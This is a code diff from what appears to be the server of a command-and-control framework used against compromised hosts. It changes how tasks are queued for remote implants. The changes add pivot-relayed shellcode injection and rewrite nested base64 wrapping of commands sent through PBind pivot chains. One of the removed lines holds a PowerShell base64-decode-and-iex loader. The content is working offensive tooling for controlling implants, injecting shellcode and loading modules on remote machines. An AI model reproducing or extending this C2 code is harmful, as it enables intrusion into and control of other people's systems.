@@ -115,7 +115,7 @@ def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
             elif (executedCmd.lower().startswith("$shellcode64")) or (executedCmd.lower().startswith("$shellcode64")):
                 DB.update_task(taskId, "Upload shellcode complete")
                 print("Upload shellcode complete")
-            elif (executedCmd.lower().startswith("run-exe core.program core inject-shellcode")) or (executedCmd.lower().startswith("pbind-command run-exe core.program core inject-shellcode")):
+            elif (executedCmd.lower().startswith("run-exe core.program core inject-shellcode")) or (executedCmd.lower().startswith("pbind-command run-exe core.program core inject-shellcode")) or (executedCmd.lower().startswith("pbind-pivot-command run-exe core.program core inject-shellcode")):
                 DB.update_task(taskId, "Upload shellcode complete")
                 print(outputParsed)
             elif "download-file" in executedCmd.lower():
@@ -240,7 +240,7 @@ def newTask(path):
                     implant = DB.get_implantbyrandomuri(RandomURI)
                     implant_type = DB.get_implanttype(RandomURI)
                     now = datetime.datetime.now()
-                    if (command.lower().startswith("$shellcode64")) or (command.lower().startswith("$shellcode86") or command.lower().startswith("run-exe core.program core inject-shellcode") or command.lower().startswith("run-exe pbind pbind run-exe core.program core inject-shellcode") or command.lower().startswith("pbind-command run-exe core.program core inject-shellcode")):
+                    if (command.lower().startswith("$shellcode64")) or (command.lower().startswith("$shellcode86") or command.lower().startswith("run-exe core.program core inject-shellcode") or command.lower().startswith("run-exe pbind pbind run-exe core.program core inject-shellcode") or command.lower().startswith("pbind-command run-exe core.program core inject-shellcode") or command.lower().startswith("pbind-pivot-command run-exe core.program core inject-shellcode")):
                         user_command = "Inject Shellcode: %s" % command[command.index("#") + 1:]
                         command = command[:command.index("#")]
                     elif (command.lower().startswith('upload-file') or command.lower().startswith('pbind-command upload-file')):
@@ -325,8 +325,10 @@ def newTask(path):
                     elif task[2].startswith("pbind-pivot-command run-exe Program PS "):
                         try:
                             cmd = (task[2]).replace("pbind-pivot-command run-exe Program PS ", "")
-                            modulestr = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
-                            command = "run-exe PBind PBind run-exe PBind PBind run-exe Program PS %s" % modulestr
+                            base64string = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
+                            modulestr = base64.b64encode(f"run-exe Program PS {base64string}".encode("utf-8")).decode("utf-8")
+                            doublebase64string = base64.b64encode(f"run-exe PBind PBind {modulestr}".encode("utf-8")).decode("utf-8")
+                            command = "run-exe PBind PBind %s" % doublebase64string
                         except Exception as e:
                             print("Cannot base64 the command for PS")
                             print(e)
@@ -334,8 +336,9 @@ def newTask(path):
                     elif task[2].startswith("pbind-command run-exe Program PS "):
                         try:
                             cmd = (task[2]).replace("pbind-command run-exe Program PS ", "")
-                            modulestr = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
-                            command = "run-exe PBind PBind run-exe Program PS %s" % modulestr
+                            base64string = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
+                            modulestr = base64.b64encode(f"run-exe Program PS {base64string}".encode("utf-8")).decode("utf-8")
+                            command = "run-exe PBind PBind %s" % modulestr
                         except Exception as e:
                             print("Cannot base64 the command for PS")
                             print(e)
@@ -367,24 +370,13 @@ def newTask(path):
                     elif task[2].startswith("pbind-pivot-loadmodule "):
                         try:
                             module_name = (task[2]).replace("pbind-pivot-loadmodule ", "")
-                            if ".exe" in module_name:
+                            if ".exe" in module_name or ".dll" in module_name:
                                 for modname in os.listdir(ModulesDirectory):
                                     if modname.lower() in module_name.lower():
                                         module_name = modname
                                 modulestr = load_module_sharp(module_name)
-                                command = "run-exe PBind PBind run-exe PBind PBind \"loadmodule%s\"" % modulestr
-                            elif ".dll" in module_name:
-                                for modname in os.listdir(ModulesDirectory):
-                                    if modname.lower() in module_name.lower():
-                                        module_name = modname
-                                modulestr = load_module_sharp(module_name)
-                                command = "run-exe PBind PBind run-exe PBind PBind \"loadmodule%s\"" % modulestr
-                            else:
-                                for modname in os.listdir(ModulesDirectory):
-                                    if modname.lower() in module_name.lower():
-                                        module_name = modname
-                                modulestr = load_module(module_name)
-                                command = "run-exe PBind PBind run-exe PBind PBind \"`$mk = '%s';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$mk))|iex\"" % base64.b64encode(bytes(modulestr, "utf-8")).decode('utf-8')
+                                base64string = base64.b64encode(f"run-exe PBind PBind \"loadmodule{modulestr}\"".encode("utf-8")).decode("utf-8")
+                                command = f"run-exe PBind PBind {base64string}"
                         except Exception as e:
                             print("Cannot find module, loadmodule is case sensitive!")
                             print(e)
@@ -430,8 +422,9 @@ def newTask(path):
 
                     elif task[2].startswith("pbind-pivot-command "):
                         try:
-                            cmd = command.replace("pbind-pivot-command ", "run-exe PBind PBind")
-                            base64string = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
+                            cmd = command.replace("pbind-pivot-command ", "")
+                            base64string1 = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
+                            base64string = base64.b64encode(f"run-exe PBind PBind {base64string1}".encode("utf-8")).decode("utf-8")
                             command = "run-exe PBind PBind %s" % base64string
                         except Exception as e:
                             print("Cannot base64 the command for PS")
